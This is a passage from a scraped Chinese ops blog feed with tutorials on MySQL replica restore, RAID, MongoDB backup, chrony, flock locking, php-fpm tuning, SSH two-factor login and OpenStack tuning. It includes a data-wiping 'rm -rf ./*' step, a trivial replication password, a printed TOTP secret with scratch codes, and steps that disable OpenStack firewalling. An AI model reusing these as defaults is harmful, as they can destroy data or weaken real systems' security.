repl@&#39;10.0.0.%&#39; identified by &#39;123&#39;; 从库操作 从库恢复全量数据 1234567891011121314151617&#x2F;etc&#x2F;init.d&#x2F;mysqld stop #停库 cd &#x2F;data&#x2F;B&#x2F;mysql&#x2F; &amp;&amp; cp -R data data_bak cd data &amp;&amp; rm -rf .&#x2F;* #清空数据gzip -d NewAll31.xbstream.gz &amp;&amp; xbstream -xC NewAll31.xbstream全量数据整合innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --apply-log &#x2F;data&#x2F;B&#x2F;mysql_tmp&#x2F;NewAll31全量数据恢复innobackupex --defaults-file&#x3D;&#x2F;etc&#x2F;my.cnf --user&#x3D;root --copy-back &#x2F;data&#x2F;B&#x2F;mysql_tmp&#x2F;NewAll31变更文件属主属组chown -R mysql.mysql &#x2F;data&#x2F;B&#x2F;mysql&#x2F;data 启动库&#x2F;etc&#x2F;init.d&#x2F;mysqld start CHANGE MASTER TO 12345678910进入mysql并执行如下指令CHANGE MASTER TO MASTER_HOST&#x3D;&#39;10.0.0.20&#39;, MASTER_USER&#x3D;&#39;repl&#39;, MASTER_PASSWORD&#x3D;&#39;123&#39;, MASTER_PORT&#x3D;3306, MASTER_LOG_FILE&#x3D;&#39;mysql-bin.003374&#39;, MASTER_LOG_POS&#x3D;1016625221; 注：上面两行的意思是从库将从这个binlog和这个POS号开始进行数据同步 启动slave并验证 123接着在数据库执行start slave；show slave status\\G","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"MySQL主从复制","slug":"MySQL主从复制","permalink":"https://garywu520.github.io/tags/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"},{"name":"全备还原","slug":"全备还原","permalink":"https://garywu520.github.io/tags/%E5%85%A8%E5%A4%87%E8%BF%98%E5%8E%9F/"}]},{"title":"Dell远控卡iDRAC6固件升级","slug":"Dell远控卡iDRAC6固件升级","date":"2018-01-30T06:36:12.000Z","updated":"2018-02-01T04:02:33.523Z","comments":true,"path":"2018/01/30/Dell远控卡iDRAC6固件升级/","link":"","permalink":"https://garywu520.github.io/2018/01/30/Dell%E8%BF%9C%E6%8E%A7%E5%8D%A1iDRAC6%E5%9B%BA%E4%BB%B6%E5%8D%87%E7%BA%A7/","excerpt":"1适用于Dell r710，r810，r910等服务器","text":"1适用于Dell r710，r810，r910等服务器 1234(1)下载idrac6固件(iDRAC6_1.80_A01_FW_IMG.exe),双击进行解压，得到文件firmimg.d6(2) web访问远控卡(3) 点远程访问——更新——浏览选择固件文件(4) 等待上传——下一步——完成 所有版本固件下载","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"iDRAC6","slug":"iDRAC6","permalink":"https://garywu520.github.io/tags/iDRAC6/"},{"name":"远控卡","slug":"远控卡","permalink":"https://garywu520.github.io/tags/%E8%BF%9C%E6%8E%A7%E5%8D%A1/"}]},{"title":"Dell RAID控制卡使用-说明","slug":"Dell RAID控制卡使用-说明","date":"2018-01-30T03:17:53.000Z","updated":"2018-01-30T04:04:30.235Z","comments":true,"path":"2018/01/30/Dell RAID控制卡使用-说明/","link":"","permalink":"https://garywu520.github.io/2018/01/30/Dell%20RAID%E6%8E%A7%E5%88%B6%E5%8D%A1%E4%BD%BF%E7%94%A8-%E8%AF%B4%E6%98%8E/","excerpt":"1本文以Dell PERC系列为例,细说RAID控制卡使用","text":"1本文以Dell PERC系列为例,细说RAID控制卡使用 初始化RAID配置信息,不删除磁盘数据(恢复硬盘的用户数据) 1(1)服务器开机，系统自检，加载到PERC卡自检界面的时候，按&lt;CTRL+R&gt;进入PERC BIOS管理界面 123(2) 进入PERC管理界面后,可以看到已经存在的RAID信息 我这里假设有2组RIAD, 第一组:简称RAID1 ,第二组: 简称RAID2 以RAID2为例 1(3) 高亮选中需要管理的RAID2，按F2，选择“Clear Config” ,这里告警提示选择&quot;YES&quot;确认, 此时PERC卡RAID2磁盘阵列信息清除成功，查看磁盘列表，各个磁盘状态已经变为“Ready”. 注：到这步，只清除了RAID的配置信息，没有清除硬盘上的用户数据 1234(4) RAID阵列重建并保留磁盘数据先检查确认硬盘都处于“Ready”状态，高亮选中需要配置的PERC卡，按F2，在弹出菜单里选择“Create New VD”来创建新阵列。选择RAID Level:RAID5 --- 并选择三块盘 --- OK RAID阵列的初始化与管理 1创建RAID阵列的目的是新部署一台服务器，我们建议所有新创建的RAID阵列都应该做初始化操作，这样，硬盘上原有的用户数据将被清除，以便进行后续的系统，软件安装。 阵列初始化 12345(1) 高亮选择已创建好的阵列 -- 按F2 --选择Initialization -- 选择Start Init将进入阵列初始化(Stop Init可以将初始化过程停止) 注： 屏幕右上方可以看到初始化的进度百分比。用户需要等待初始化进程结束，才可以开始使用该阵列。注：也可以选择Fast Init，进入的是后台的阵列初始化过程。这个过程在后台自动进行，对用户是透明的，用户可以重启服务器，可以马上开始使用阵列安装系统及软件。初始化的进程在服务器开机状态下，会继续完成所需的初始化步骤，直至结束。 图文参考：andy","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"RAID","slug":"RAID","permalink":"https://garywu520.github.io/tags/RAID/"},{"name":"RAID控制卡","slug":"RAID控制卡","permalink":"https://garywu520.github.io/tags/RAID%E6%8E%A7%E5%88%B6%E5%8D%A1/"}]},{"title":"MongoDB 备份(mongodump)与恢复(mongorestore)","slug":"MongoDB 备份(mongodump)与恢复(mongorestore)","date":"2018-01-26T03:35:10.000Z","updated":"2018-01-26T04:02:47.557Z","comments":true,"path":"2018/01/26/MongoDB 备份(mongodump)与恢复(mongorestore)/","link":"","permalink":"https://garywu520.github.io/2018/01/26/MongoDB%20%E5%A4%87%E4%BB%BD(mongodump)%E4%B8%8E%E6%81%A2%E5%A4%8D(mongorestore)/","excerpt":"Mongodb数据备份 12在Mongodb中我们使用mongodump命令来备份MongoDB数据。该命令可以导出所有数据到指定目录中。mongodump命令可以通过参数指定导出的数据量级转存的服务器。","text":"Mongodb数据备份 12在Mongodb中我们使用mongodump命令来备份MongoDB数据。该命令可以导出所有数据到指定目录中。mongodump命令可以通过参数指定导出的数据量级转存的服务器。 语法 mongodump 备份命令脚本语法如下： 12345678910备份&#x2F;usr&#x2F;local&#x2F;mongo&#x2F;bin&#x2F;mongodump -h 127.0.0.1:27017 -d dbname -o &#x2F;tmp&#x2F;mongobak-u: 用户名-p: 密码-h：MongDB所在服务器地址，例如：127.0.0.1，当然也可以指定端口号：127.0.0.1:27017-d：需要备份的数据库实例，例如：test-o：备份的数据存放位置，例如：&#x2F;tmp&#x2F;mongo，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。注：如果要导出所有数据库，可去掉-d参数及对应的数据库名称 此时可以对/tmp/mongobak文件进行压缩并下载到任意地方 1tar zcf &#x2F;tmp&#x2F;mongobak.tar.gz &#x2F;tmp&#x2F;mongobak Mongodb数据恢复 1mongodb使用 mongorestore 命令来恢复备份的数据。 注：如果待恢复的数据库中有同名数据库，可以先drop再恢复 123456清理部署# &#x2F;usr&#x2F;local&#x2F;mongo&#x2F;bin&#x2F;mongo 127.0.0.1:27017&gt; use app_auto&gt; db.dropDatabase()&gt; exitbye 恢复 123456789101112恢复mongorestore -h &lt;hostname&gt;&lt;:port&gt; -d dbname &lt;path&gt;--host &lt;:port&gt;, -h &lt;:port&gt;：MongoDB所在服务器地址，默认为： localhost:27017--db , -d ：需要恢复的数据库实例，例如：test，当然这个名称也可以和备份时候的不一样，比如test2--drop：恢复的时候，先删除当前数据，然后恢复备份的数据。&lt;path&gt;：mongorestore 最后的一个参数，设置备份数据所在位置，例如：&#x2F;tmp&#x2F;mongobak--dir：指定备份的目录注： 你不能同时指定 &lt;path&gt; 和 --dir 选项，--dir也可以设置备份目录。注：还原所有数据库到mongodb中的话，恢复时不指定-d参数和具体数据库名称即可。 验证恢复 12mongo -h 127.0.0.1:27017&gt;show dbs","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"mongodb","slug":"mongodb","permalink":"https://garywu520.github.io/tags/mongodb/"},{"name":"mongodump","slug":"mongodump","permalink":"https://garywu520.github.io/tags/mongodump/"},{"name":"mongorestore","slug":"mongorestore","permalink":"https://garywu520.github.io/tags/mongorestore/"}]},{"title":"chrony时间同步","slug":"chrony时间同步","date":"2018-01-26T02:40:29.000Z","updated":"2018-02-26T12:11:06.052Z","comments":true,"path":"2018/01/26/chrony时间同步/","link":"","permalink":"https://garywu520.github.io/2018/01/26/chrony%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/","excerpt":"1部署一些高级服务基本都依赖于系统时间，而ntp过于古老，在某些场景下虽然时间更新完毕，但程序并不能检测到。所以使用chrony来搞一套时间服务器","text":"1部署一些高级服务基本都依赖于系统时间，而ntp过于古老，在某些场景下虽然时间更新完毕，但程序并不能检测到。所以使用chrony来搞一套时间服务器 chrony简介 123chrony 是 RedHat 开发的，它是网络时间协议（NTP）的另一种实现；chrony 可以同时做为 ntp 服务的客户端和服务端；安装完后有两个程序 chronyd、chronyc：chronyd 是一个 daemon 守护进程，chronyc 是用来监控 chronyd 性能和配置参数的命令行工具。 实验环境 123系统版本：CentOS 7.2chrony_server: 10.0.10.11chrony_client: 10.0.10.12 server配置 12安装yum -y install chrony 1234567891011配置vim &#x2F;etc&#x2F;chrony.conf## 上游公共 ntp 服务器server 0.asia.pool.ntp.org iburstserver 1.asia.pool.ntp.org iburstserver 2.asia.pool.ntp.org iburstserver 3.asia.pool.ntp.org iburst## 允许 192.168.255.0&#x2F;24 主机同步时间allow 10.0.10.0&#x2F;24 全球授时中心 123启动systemctl enable chronydsystemctl start chronyd 123验证timedatectl status 查看时间同步状态；timedatectl set-ntp true 开启网络时间同步； chronyc用法 1234567891011查看 ntp_servers 状态chronyc sources -v查看 ntp_sync 状态chronyc sourcestats -v查看 ntp_servers 是否在线chronyc activity -v查看 ntp 详细信息chronyc tracking -v client配置 12安装yum -y install chrony 12345配置vim &#x2F;etc&#x2F;chrony.conf 内网 ntp_server IPserver 10.0.10.11 iburst 1234启动systemctl enable chronydsystemctl start chronyd 使用方法同server","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ntp","slug":"ntp","permalink":"https://garywu520.github.io/tags/ntp/"},{"name":"chrony","slug":"chrony","permalink":"https://garywu520.github.io/tags/chrony/"},{"name":"时间同步","slug":"时间同步","permalink":"https://garywu520.github.io/tags/%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5/"}]},{"title":"Linux下压缩百G目录问题","slug":"Linux下压缩百G目录问题","date":"2018-01-25T12:30:22.000Z","updated":"2018-01-25T12:43:40.322Z","comments":true,"path":"2018/01/25/Linux下压缩百G目录问题/","link":"","permalink":"https://garywu520.github.io/2018/01/25/Linux%E4%B8%8B%E5%8E%8B%E7%BC%A9%E7%99%BEG%E7%9B%AE%E5%BD%95%E9%97%AE%E9%A2%98/","excerpt":"1关于大文件或目录压缩问题，进行整理，以备后忘。","text":"1关于大文件或目录压缩问题，进行整理，以备后忘。 文件压缩 12345678910压缩:xz -z 要压缩的文件如果要保留被压缩的文件加上参数 -k ;如果要设置压缩率: 加入参数 -0 到 -9调节压缩率。如果不设置，默认压缩等级是6解压xz -d 要解压的文件同样使用 -k 参数来保留被解压缩的文件。 目录压缩 1234567891011121314压缩上百G的目录，工具不是很多，一开始使用了tar，慢成了狗，五六个小时还在继续，无奈尝试使用zip。zip压缩方法：zip -q -r allbackup_2018-01-23.zip .&#x2F;2018-01-23参数说明：-q 安静模式，在压缩的时候不显示指令的执行过程-r 将指定的目录下的所有子目录以及文件一起处理解压 unzip xahot.zip #默认解压到当前目录","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zip","slug":"zip","permalink":"https://garywu520.github.io/tags/zip/"},{"name":"xz","slug":"xz","permalink":"https://garywu520.github.io/tags/xz/"},{"name":"gzip","slug":"gzip","permalink":"https://garywu520.github.io/tags/gzip/"},{"name":"压缩","slug":"压缩","permalink":"https://garywu520.github.io/tags/%E5%8E%8B%E7%BC%A9/"}]},{"title":"给shell脚本加锁","slug":"给shell脚本加锁","date":"2018-01-23T08:23:01.000Z","updated":"2018-01-23T08:59:18.140Z","comments":true,"path":"2018/01/23/给shell脚本加锁/","link":"","permalink":"https://garywu520.github.io/2018/01/23/%E7%BB%99shell%E8%84%9A%E6%9C%AC%E5%8A%A0%E9%94%81/","excerpt":"1由于怕shell脚本执行时间过长，后台会堆积一堆的脚本进程，这时候就需要给脚本加锁,保证脚本进程唯一","text":"1由于怕shell脚本执行时间过长，后台会堆积一堆的脚本进程，这时候就需要给脚本加锁,保证脚本进程唯一 flock提供了一种更清爽的办法来实现这一功能 以下内容可直接贴到脚本中使用 123456789#! &#x2F;bin&#x2F;bashLOCKFILE&#x3D;&quot;&#x2F;var&#x2F;lock&#x2F;$(basename $0).lock&quot;exec 200&gt;$LOCKFILEflock -n 200 || &#123; echo &quot;Another user is doing the same thing，please enter [ctrl+c]&quot; flock 200 exit 1&#125; 参数说明： 123456exec 200&gt;$LOCKFILE这一行将LOCKFILE和文件描述符200以“写”的方式连接起来（不需要LOCKFILE事先存在,没有会自动创建），之后flock尝试获得文件描述符200的锁。-n参数表示如果失败则直接fail而不等待。所以这里如果没有获得锁的话，会输出一条提示信息，然后以阻塞的方式等待获得文件描述符200的锁。 最后的&quot;exit 1&quot;是我改进的，当有此脚本进程运行时，除了提示信息之外，约10s左右自动退出。 1最给力的是，在整个shell脚本执行结束时，文件描述符200会关闭，则其上的锁也就会自动释放。然后由下一个执行脚本的进程再将“LOCKFILE和文件描述符200以“写”的方式连接起来”... 关于锁测试 121. 开启两个终端，一个终端先执行脚本自定义的for循环。2. 然后另一个终端再执行此脚本,终端会提示“Another user is doing the same thing，please enter [ctrl+c]” 测试脚本如下： 123456789101112131415161718#! &#x2F;bin&#x2F;bash##---------------脚本锁开始区域-----------------------------------##LOCKFILE&#x3D;&quot;&#x2F;var&#x2F;lock&#x2F;$(basename $0)&quot;exec 200&gt;$LOCKFILEflock -n 200 || &#123; echo &quot;Another user is doing the same thing，please enter [ctrl+c]&quot; flock 200 exit 1&#125;##---------------脚本锁结束区域-----------------------------------##for i in 1 2 3 4do echo &quot;Hello World&quot; sleep 5done","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"shell","slug":"shell","permalink":"https://garywu520.github.io/tags/shell/"},{"name":"shell编程","slug":"shell编程","permalink":"https://garywu520.github.io/tags/shell%E7%BC%96%E7%A8%8B/"},{"name":"flock","slug":"flock","permalink":"https://garywu520.github.io/tags/flock/"}]},{"title":"php-fpm.conf配置优化","slug":"php-fpm-conf配置优化","date":"2018-01-23T03:53:17.000Z","updated":"2018-01-23T04:03:38.891Z","comments":true,"path":"2018/01/23/php-fpm-conf配置优化/","link":"","permalink":"https://garywu520.github.io/2018/01/23/php-fpm-conf%E9%85%8D%E7%BD%AE%E4%BC%98%E5%8C%96/","excerpt":"1zabbix告警业务资源占用过高，可根据以下参数说明进行相应调整。","text":"1zabbix告警业务资源占用过高，可根据以下参数说明进行相应调整。 优化后如下,其中数值大小还需与实际业务相关联 1234567891011121314pid &#x3D; &#x2F;app&#x2F;logs&#x2F;php-fpm.piderror_log &#x3D; &#x2F;app&#x2F;logs&#x2F;php-fpm.loglog_level &#x3D; error #记录日志级别rlimit_files &#x3D; 32768 #文件描述符设置events.mechanism &#x3D; epoll #事件模型listen.owner &#x3D; nginx #进程使用的用户listen.group &#x3D; nginx #进程使用的用户组pm &#x3D; dynamicpm.max_children &#x3D; 1024 #允许最大的子进程数pm.start_servers &#x3D; 16 #启动的进程数pm.min_spare_servers &#x3D; 5 #最小空闲进程数(动态模式生效)pm.max_spare_servers &#x3D; 20 #最大空闲进程数(动态模式生效)pm.process_idle_timeout &#x3D; 15s; #空闲的进程多少被被杀掉(ondemand) pm.max_requests &#x3D; 2048 #处理完多少个请求,重新启动进程 关于php-fpm进程管理方式 123456789php-fpm有两种管理进程的方式，分别是static和dynamic。如果设置成static，进程数自始至终都是pm.max_children指定的数量，pm.start_servers，pm.min_spare_servers，pm.max_spare_servers配置将没有作用。如果设置成dynamic，则进程数是动态的，最开始是pm.start_servers指定的数量，如果请求较多，则会自动增加，但不超过 pm.max_children指定的数量，同时保证空闲的进程数不小于pm.min_spare_servers，如果进程数较多，也会进行相应清理， 保证多余的进程数不多于pm.max_spare_servers。当php-fpm启动后，一个php-cgi进程约战3M内存，但是当它们处理过一些请求后，有些内存是释放不掉的，占用的内存能达到20M-30M不等。对于内存比较吃紧，同时并发量不是很大的应用，可以考虑采用static的方式，这样可以很好的控制php-fpm的所消耗的总内存数，让系统更加 平稳运行。另外由于并发量很小，可以适当的把设置pm.max_requests小一些，以便让php-fpm进程有机会重启，从而释放其占用的内存。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"php","slug":"php","permalink":"https://garywu520.github.io/tags/php/"},{"name":"php-fpm","slug":"php-fpm","permalink":"https://garywu520.github.io/tags/php-fpm/"},{"name":"php优化","slug":"php优化","permalink":"https://garywu520.github.io/tags/php%E4%BC%98%E5%8C%96/"}]},{"title":"ssh登陆基于Google Authenticator实现双因素认证","slug":"ssh登陆基于Google-Authenticator实现双因素认证","date":"2018-01-22T06:02:24.000Z","updated":"2018-01-22T06:06:23.012Z","comments":true,"path":"2018/01/22/ssh登陆基于Google-Authenticator实现双因素认证/","link":"","permalink":"https://garywu520.github.io/2018/01/22/ssh%E7%99%BB%E9%99%86%E5%9F%BA%E4%BA%8EGoogle-Authenticator%E5%AE%9E%E7%8E%B0%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81/","excerpt":"介绍 1简单说，就像我们几年前去银行办卡送的口令牌，以及网易游戏中的将军令，在你使用网银或登陆游戏时会再让你输入动态口令的。","text":"介绍 1简单说，就像我们几年前去银行办卡送的口令牌，以及网易游戏中的将军令，在你使用网银或登陆游戏时会再让你输入动态口令的。 1双因素认证：双因素身份认证就是通过你所知道再加上你所能拥有的这二个要素组合到一起才能发挥作用的身份认证系统。双因素认证是一种采用时间同步技术的系统，采用了基于时间、事件和密钥三变量而产生的一次性密码来代替传统的静态密码。每个动态密码卡都有一个唯一的密钥，该密钥同时存放在服务器端，每次认证时动态密码卡与服务器分别根据同样的密钥，同样的随机参数（时间、事件）和同样的算法计算了认证的动态密码，从而确保密码的一致性，从而实现了用户的认证。因每次认证时的随机参数不同，所以每次产生的动态密码也不同。由于每次计算时参数的随机性保证了每次密码的不可预测性，从而在最基本的密码认证这一环节保证了系统的安全性。 目的 1实现登录Linux 服务器时，除了输入用户名密码外，需要输入一次性的动态口令才能验证成功。当然也可以实现ssh密钥登陆+动态口令 部署 安装chrony 123生成动态口令的其中一个因素是时间，需要保持终端设备和服务器的系统时间一致，才能生成同一的动态口令简单说下chrony：chrony 是网络时间协议的（NTP）的另一种实现，与网络时间协议后台程序（ntpd）不同，它可以更快地更准确地同步系统始终。 NTP中国授时中心 1234567891011121314安装yum install -y chrony配置vim &#x2F;etc&#x2F;chrony.confserver 0.cn.pool.ntp.org iburst启动systemctl restart chronydchronyc sources验证[root@localhost ~]# date2016年 12月 31日 星期六 09:30:24 CST 安装依赖组件 1yum install -y git automake libtool pam-devel 下载Google认证模块 12345git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;google-authenticator-libpam.gitcd google-authenticator-libpam&#x2F;.&#x2F;bootstrap.sh.&#x2F;configuremake &amp;&amp; make install 修改sshd支持pam 1234vim &#x2F;etc&#x2F;pam.d&#x2F;sshd在首行添加如下:auth required pam_google_authenticator.so 配置ssh 1234567vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config添加或修改以下内容:ChallengeResponseAuthentication yesUsePAM yessystemctl restart sshd 生成Google authenticator配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[root@localhost ~]# google-authenticatorDo you want authentication tokens to be time-based (y&#x2F;n) y#你想做的认证令牌是基于时间的吗？Warning: pasting the following URL into your browser exposes the OTP secret to Google:https:&#x2F;&#x2F;www.google.com&#x2F;chart?chs&#x3D;200x200&amp;chld&#x3D;M|0&amp;cht&#x3D;qr&amp;chl&#x3D;otpauth:&#x2F;&#x2F;totp&#x2F;root@localhost.localdomain%3Fsecret%3DN4HLEJOQHT27VCR6RX66WXB2SY%26issuer%3Dlocalhost.localdomain注：上面的URL是生成的二维码链接，稍后客户端需要用到Your new secret key is: N4HLEJOQHT27VCR6RX66WXB2SYYour verification code is 299695Your emergency scratch codes are: 44477086 92790948 29251218 26350870 30696065注：上面列出的几个字符串是应急码，如果客户端无法使用，可以使用应急码登陆，所以务必妥善保管！Do you want me to update your &quot;&#x2F;root&#x2F;.google_authenticator&quot; file? (y&#x2F;n) y#你希望我更新你的“&#x2F;root&#x2F;.google_authenticator”文件吗(y&#x2F;n)？Do you want to disallow multiple uses of the same authenticationtoken? This restricts you to one login about every 30s, but it increasesyour chances to notice or even prevent man-in-the-middle attacks (y&#x2F;n) y#你希望禁止多次使用同一个验证令牌吗?这限制你每次登录的时间大约是30秒， 但是这加大了发现或甚至防止中间人攻击的可能性(y&#x2F;n)?By default, a new token is generated every 30 seconds by the mobile app.In order to compensate for possible time-skew between the client and the server,we allow an extra token before and after the current time. This allows for atime skew of up to 30 seconds between authentication server and client. If youexperience problems with poor time synchronization, you can increase the windowfrom its default size of 3 permitted codes (one previous code, the currentcode, the next code) to 17 permitted codes (the 8 previous codes, the currentcode, and the 8 next codes). This will permit for a time skew of up to 4 minutesbetween client and server.Do you want to do so? (y&#x2F;n) y#默认情况下，令牌保持30秒有效;为了补偿客户机与服务器之间可能存在的时滞，我们允许在当前时间前后有一个额外令牌。如果你在时间同步方面遇到了问题， 可以增加窗口从默认的3个可通过验证码增加到17个可通过验证码，这将允许客户机与服务器之间的时差增加到4分钟。你希望这么做吗(y&#x2F;n)?If the computer that you are logging into isn&#39;t hardened against brute-forcelogin attempts, you can enable rate-limiting for the authentication module.By default, this limits attackers to no more than 3 login attempts every 30s.Do you want to enable rate-limiting? (y&#x2F;n) y#如果你登录的那台计算机没有经过固化，以防范运用蛮力的登录企图，可以对验证模块启用尝试次数限制。默认情况下，这限制攻击者每30秒试图登录的次数只有3次。 你希望启用尝试次数限制吗(y&#x2F;n)? 1注：创建后在家目录下有个隐藏文件为.google-authenticator的文件，记住第一行私钥，手机客户端会用到 手机安装Google Authenticator客户端 1运行后，添加 --&gt; 手动输入验证码 --&gt; 账户：随意定一个英文名字，最好“见名知意” --&gt;密钥: 复制粘贴$HOME&#x2F;.google-authenticator隐藏配置文件中的首行密钥 登陆验证 1234567注意，第一次登录可能会出现登录失败的情况，查看日志信息显示错误如下：tail -n10 &#x2F;var&#x2F;log&#x2F;secure&#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_google_authenticator.so: cannot open shared object file: No such file or directory解决方法：ln -sv &#x2F;usr&#x2F;local&#x2F;lib&#x2F;security&#x2F;pam_google_authenticator.so &#x2F;usr&#x2F;lib64&#x2F;security&#x2F;pam_google_authenticator.so 1234[root@controler ~]# ssh 10.0.10.24Verification code: #此处输入手机的动态口令Password: #此处输入服务器密码Last login: Mon Jan 22 13:46:31 2018 from 10.0.10.11","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"chrony","slug":"chrony","permalink":"https://garywu520.github.io/tags/chrony/"},{"name":"Google Authenticator","slug":"Google-Authenticator","permalink":"https://garywu520.github.io/tags/Google-Authenticator/"}]},{"title":"深入理解OpenStack-高级优化","slug":"深入理解OpenStack-高级优化","date":"2018-01-18T08:53:23.000Z","updated":"2018-01-18T10:16:47.331Z","comments":true,"path":"2018/01/18/深入理解OpenStack-高级优化/","link":"","permalink":"https://garywu520.github.io/2018/01/18/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3OpenStack-%E9%AB%98%E7%BA%A7%E4%BC%98%E5%8C%96/","excerpt":"目录","text":"目录 OpenStack综合排错 动态调整虚拟机大小 关闭neutron防火墙 VCPU超配 添加计算节点的步骤 flat网络给虚拟机添加公网/内网等多网卡 关于Cinder存储 关于MySQL 关于RabbitMQ OpenStack综合排错 12345671.第一步，保证所有服务都是up的状态openstack compute service listopenstack network agent list2.看日志：控制节点和计算节点都要看。grep &#39;ERROR&#39; &#x2F;var&#x2F;log&#x2F;nova&#x2F;*grep &#39;ERROR&#39; &#x2F;var&#x2F;log&#x2F;neutron&#x2F;* 动态调整虚拟机配置大小 12345有时虚拟机创建后发现虚拟机规格太小，满足不了业务需求。于是需要在线拉伸虚拟机的规格。 修改控制节点和各个计算节点的nova.conf文件，进行如下配置：allow_resize_to_same_host&#x3D;Trueenabled_filters&#x3D;RetryFilter,AvailabilityZoneFilter,ComputeFilter,ComputeCapabilitiesFilter,ImagePropertiesFilter,ServerGroupAntiAffinityFilter,ServerGroupAffinityFilter 1在控制节点和各个计算节点重启nova服务 关闭neutron防火墙 12345修改计算节点防火墙vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.inifirewall_driver &#x3D; neutron.agent.firewall.NoopFirewallDriverenable_security_group &#x3D; False VCPU超配 123456789OpenStack的CPU超配比例是1：16（最新P版默认值是0.0,表示不超分），内存超配比例是1：1.5（最新P版默认值是0.0）。计算方法: cat &#x2F;proc&#x2F;cpuinfo里面的逻辑核数，再x16就是你能够分配给虚拟机的。内存也是类似。分别修改控制节点和计算节点的&#x2F;etc&#x2F;nova&#x2F;nova.conf配置文件#cpu_allocation_ratio&#x3D;16.0#ram_allocation_ratio&#x3D;1.5配置完成后，只需要重启控制节点的nova-scheduler服务即可。这个值其实是给nova-scheduler调度看的，可根据实际需求进行决策是否要开启超配，另内存不建议超配！！！ 添加计算节点的步骤 12345671. 安装操作系统2. 安装openstack包3. 安装nova-compute neutron-linuxbridge-agent4. SCP配置文件到新节点5. 检查配置文件权限,并启动服务6. 发现主机(配置文件已配置了自动发现) su -s &#x2F;bin&#x2F;sh -c &quot;nova-manage cell_v2 discover_hosts --verbose&quot; nova flat网络给云主机添加(外网/内网)多网卡 12345思路：在控制节点创建两个或多个扁平桥接网络即可实现,具体操作如下：前提是：物理服务器必须同时有公网IP地址和内网IP地址，provider是桥接到内网网卡(eth1)，然后internet桥接到公网IP的网卡上(eth0),最后在dashboard创建虚拟机的时候同时选择这两个flat网络。测试：1. 每台物理机器添加2块网卡并配置对应内外网IP地址 12345678910112. 控制节点配置 vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;ml2_conf.ini flat_networks &#x3D; provider,internet 配置flat名称，一个内网provider,一个外网internet vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.ini physical_interface_mappings &#x3D; provider:eth1,internet:eth0 2块网卡分别做映射 systemctl restart neutron-server neutron-linuxbridge-agent 重启服务 1234563. 多个计算节点分别配置neutronbridge_agent.ini vim &#x2F;etc&#x2F;neutron&#x2F;plugins&#x2F;ml2&#x2F;linuxbridge_agent.ini physical_interface_mappings &#x3D; provider:eth1,internet:eth0 重启服务 systemctl restart neutron-server neutron-linuxbridge-agent 12344. 控制节点创建2个flat的网络openstack network create --share --external --provider-physical-network provider --provider-network-type flat provideropenstack network create --share --external --provider-physical-network internet --provider-network-type flat internet 123456789101112135. 控制节点分别创建子网openstack subnet create --network provider \\ --allocation-pool start&#x3D;192.168.57.100,end&#x3D;192.168.57.200 \\ --dns-nameserver 223.5.5.5 --gateway 192.168.57.2 \\ --subnet-range 192.168.57.0&#x2F;24 provideropenstack subnet create --network internet \\ --allocation-pool start&#x3D;1.1.1.10,end&#x3D;1.1.1.15 \\ --dns-nameserver 223.5.5.5 --gateway 1.1.1.1 \\ --subnet-range 1.1.1.0&#x2F;24 internet注：如果是公网IP地址不连续，起始和结束IP都写一个，在dashboard中外网flat(internet)DHCP可以加多行。 126. dashboard创建虚拟机 创建的时候选择两个网络,即provider和internet 关于Cinder存储 1234567891011虚拟机默认存到了&#x2F;var&#x2F;lib&#x2F;nova&#x2F;instances目录中1. 本地硬盘 优点：性能好 2. 网络硬盘&#x2F;云硬盘 Cinder管理: NFS&#x2F;Gluster&#x2F;Ceph 存储网络建议: 万兆网卡或者3个千兆网卡做bonding 单个存储不建议超过12台虚拟机，否则会导致网卡io下降,但可以做多个云存储 3. 本地硬盘+云硬盘 关于MySQL 1如果生产配置环境中,创建虚拟机操作过慢，可能原因是mysql数据库的原因，官方建议的最大连接数是4096，可能会超 关于RabbitMQ 12RabbitMQ作为基础服务，运行过程中禁止修改hosts解析，无法解析后，会影响虚拟机的创建。注: 